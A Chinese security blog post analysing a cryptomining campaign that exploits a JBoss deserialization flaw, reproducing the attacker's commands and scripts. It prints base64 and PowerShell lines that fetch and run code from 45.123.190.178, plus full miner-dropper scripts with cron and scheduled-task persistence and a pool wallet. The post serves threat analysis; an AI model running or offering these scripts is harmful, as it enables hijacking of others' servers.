<p>这几条日志访问的都是 /invoker/JMXInvokerServlet ，这个路径是涉及到的漏洞是 JBoss JMXInvokerServlet 反序列化漏洞， 发送包含恶意序列化对象的请求，导致远程代码执行，从里面看到相关的信息，关键的有两条：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &#123;<span class="built_in">echo</span>,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</div></pre></td></tr></table></figure>
<p>解码后：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl 45.123.190.178/lin.txt | sh</div></pre></td></tr></table></figure>
<p>和第一条日志的执行内容是一样的</p>
<p>第二部分</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -nop -c <span class="string">"iex(New-Object Net.WebClient).DownloadString('http://45.123.190.178/win.txt')"</span></div></pre></td></tr></table></figure>
<p>可以看到都是与<strong>45.123.190.178</strong>进行通信，分别下载了linux和windows环境下的脚本，下面来看一下这两个脚本:</p>
<h3 id="lin-txt"><a href="#lin-txt" class="headerlink" title="lin.txt"></a><strong>lin.txt</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/usr/sbin</div><div class="line">days=$(($(date +%s) / 60 / 60 / 24))</div><div class="line"><span class="function"><span class="title">DoMine</span></span>()</div><div class="line">&#123;</div><div class="line">rm -rf /tmp/Silence*</div><div class="line">ps -ef|grep Silence |grep -v grep</div><div class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></div><div class="line"><span class="keyword">if</span> [ -x /usr/bin/wget ] ; <span class="keyword">then</span></div><div class="line"><span class="keyword">elif</span> [ -x /usr/bin/curl ] ; <span class="keyword">then</span></div><div class="line">wget -q http://45.123.190.178/Silence -O /tmp/Silence</div><div class="line">curl -o /tmp/Silence http://45.123.190.178/Silence</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">exit</span> 0;</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/Silence</div><div class="line">nohup /tmp/Silence -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu -p x -R 1 &amp;&gt;&gt;/dev/null &amp;</div><div class="line">sleep 10</div><div class="line">rm -rf /tmp/Silence</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ -x /usr/bin/wget ] ; <span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> <span class="string">'*/15 * * * * wget -q http://45.123.190.178/lin.txt -O - |sh'</span> &gt; /tmp/.cron</div><div class="line"><span class="keyword">elif</span> [ -x /usr/bin/curl ] ; <span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> <span class="string">'*/15 * * * * curl http://45.123.190.178/lin.txt |sh'</span> &gt; /tmp/.cron</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">exit</span> 0;</div><div class="line"><span class="keyword">fi</span></div><div class="line">crontab -r</div><div class="line">crontab /tmp/.cron</div><div class="line">sleep 3</div><div class="line">rm /tmp/.cron</div><div class="line"><span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep <span class="string">"42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="variable">$&#123;days&#125;</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"logind.conf"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"cryptonight"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"kworker"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"45hsTaSqTQM4K1Xeqkcy7eLzqdEuQ594fJVmQryCemQSCU878JGQdSDCxbhNyVjSkiaYat8yAfBuRTPSEUPZoARm9a5XEHZ"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"47sghzufGhJJDQEbScMCwVBimTuq6L5JiRixD8VeGbpjCTA12noXmi4ZyBZLc99e66NtnKff34fHsGRoyZk3ES1s1V4QVcB"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"44iuYecTjbVZ1QNwjWfJSZFCKMdceTEP5BBNp4qP35c53Uohu1G7tDmShX1TSmgeJr2e9mCw2q1oHHTC2boHfjkJMzdxumM"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">pkill -f 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4</div><div class="line">pkill -f 4AniF816tMCNedhQ4J3ccJayyL5ZvgnqQ4X9bK7qv4ZG3QmUfB9tkHk7HyEhh5HW6hCMSw5vtMkj6jSYcuhQTAR1Sbo15gB</div><div class="line">pkill -f 4813za7ePRV5TBce3NrSrugPPJTMFJmEMR9qiWn2Sx49JiZE14AmgRDXtvM1VFhqwG99Kcs9TfgzejAzT9Spm5ga5dkh8df</div><div class="line">pkill -f cpuloadtest</div><div class="line">pkill -f crypto-pool</div><div class="line">pkill -f xmr</div><div class="line">pkill -f prohash</div><div class="line">pkill -f monero</div><div class="line">pkill -f miner</div><div class="line">pkill -f nanopool</div><div class="line">pkill -f minergate</div><div class="line">pkill -f yam</div><div class="line">pkill -f yam2</div><div class="line">pkill -f minerd</div><div class="line">pkill -f Circle_MI.png</div><div class="line">pkill -f curl</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"mine.moneropool.com"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"crypto-pool"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"prohash"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"monero"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"miner"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"nanopool"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"minergate"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:8080"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:3333"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:443"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"zhuabcn@yahoo.com"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"stratum"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"49JsSwt7MsH5m8DPRHXFSEit9ZTWZCbWwS7QSMUTcVuCgwAU24gni1ydnHdrT9QMibLtZ3spC7PjmEyUSypnmtAG7pyys7F"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"479MD1Emw69idbVNKPtigbej7x1ZwFR1G3boyXUFfAB89uk2AztaMdWVd6NzCTfZVpDReKEAsVVBwYpTG8fsRK3X17jcDKm"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"11231"</span> || DoMine</div></pre></td></tr></table></figure>
<p>脚本从<strong>45.123.190.178</strong>下载<strong>Silence</strong>样本进行挖矿(门罗币)，并且创建了定时任务每15分钟运行一次确保程序能够一直运行，后面则是清除一些残余进程</p>
<h3 id="win-txt"><a href="#win-txt" class="headerlink" title="win.txt"></a><strong>win.txt</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$murl</span> = <span class="string">"http://45.123.190.178/Silences.exe"</span></div><div class="line"><span class="variable">$moutput</span> = <span class="string">"<span class="variable">$env</span>:TMP\yammsb.exe"</span></div><div class="line"><span class="variable">$wc</span> = New-Object System.Net.WebClient</div><div class="line"><span class="variable">$wc</span>.DownloadFile(<span class="variable">$murl</span>, <span class="variable">$moutput</span>)</div><div class="line">cmd.exe /c <span class="variable">$env</span>:TMP\yammsb.exe</div><div class="line">SchTasks.exe /Create /SC MINUTE /TN <span class="string">"UpdateGG"</span> /TR <span class="string">"PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noexit -File <span class="variable">$env</span>:TMP\SchTask.ps1"</span> /MO 6 /F</div><div class="line"></div><div class="line"><span class="keyword">while</span> (<span class="variable">$true</span>) &#123;</div><div class="line"><span class="keyword">if</span>(!(Get-Process Carbon -ErrorAction SilentlyContinue)) &#123;</div><div class="line"><span class="built_in">echo</span> <span class="string">"Not running"</span></div><div class="line">cmd.exe /C <span class="variable">$env</span>:TMP\run.bat</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">echo</span> <span class="string">"Running"</span></div><div class="line">&#125;</div><div class="line">Start-Sleep 55</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>相应地，Windows下则是调用powershell下载，通信地址还是<strong>45.123.190.178</strong>，下载的是<strong>Silences.exe</strong>样本</p>
<p>脚本里还有三个文件: <strong>yammsb.exe  SchTask.ps1  run.bat</strong></p>
<p>跑了一下Silences.exe文件后产生了 <strong>SchTask.ps1 run.bat</strong> 两个文件，<strong>yammsb.exe</strong>暂不知道是什么，其中<strong>SchTask.ps1</strong>的内容就是上面win.txt内容，<strong>run.bat</strong>则配置了矿池的地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">taskkill /f /im Carbon.exe</div><div class="line">%temp%/Silence.exe -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu -p x --donate-level=1 -t 4</div></pre></td></tr></table></figure>
<p>里面的Carbon.exe可能与<a href="https://virus-removal-guide.net/zh/9199-carbon-exe-slowly-kills-cpu-carbon-exe-remedy/" target="_blank" rel="external">这篇文章</a>提到的有关，也是跟数字货币相关的恶意程序</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\16-32-3.png" alt="16-32-3"></p>
<p>在微步在线上也出现了相关的情报，<a href="https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=287" target="_blank" rel="external">https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=287</a>，第一次发现是在1月5号，涉及到的脚本和蜜罐上看到的是一样的:</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这次事件利用了多个java反序列化漏洞来执行恶意行为，其中不乏最近爆出的Weblogic漏洞，这几个漏洞的显著特点就是可以远程执行代码，对黑产来说是最为简单有效的利用方式，而数字货币价格的不断攀升也更加助长了层出不穷的挖矿行为。</p>
<p>相关的脚本和样本见附件，两个样本已经上传puma简单分析，对应链接</p>
<p> <a href="https://poma.nsfocus.com/report?md5=483b322b42835227d98f523f9df5c6fc" target="_blank" rel="external">https://poma.nsfocus.com/report?md5=483b322b42835227d98f523f9df5c6fc</a></p>
<p> <a href="https://poma.nsfocus.com/report?md5=e8e00e6490c1b1f07dc3d6d51fcc0d6d" target="_blank" rel="external">https://poma.nsfocus.com/report?md5=e8e00e6490c1b1f07dc3d6d51fcc0d6d</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/利用java反序列化漏洞植入门罗币挖矿程序事件分析.html" data-id="cjd9skr0t000cds1blk2u1qn6" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/01/28/metasploit备忘/">metasploit备忘</a>
          </li>
        
          <li>
            <a href="/2018/01/25/利用XMRig的大规模Monero挖矿行为/">利用XMRig的大规模Monero挖矿行为</a>
          </li>
        
          <li>
            <a href="/2018/01/05/几种常见检测思路的特点/">几种常见检测思路的特点</a>
          </li>
        
          <li>
            <a href="/2017/12/27/vBulletin-routestring-Unauthenticated-Remote-Code-Execution-Vulnerability/">vBulletin routestring Unauthenticated Remote Code Execution Vulnerability</a>
          </li>
        
          <li>
            <a href="/2017/09/12/Java反序列化漏洞利用的学习与实践/">Java反序列化漏洞利用的学习与实践</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <!--
<footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 SY0U<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
-->

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>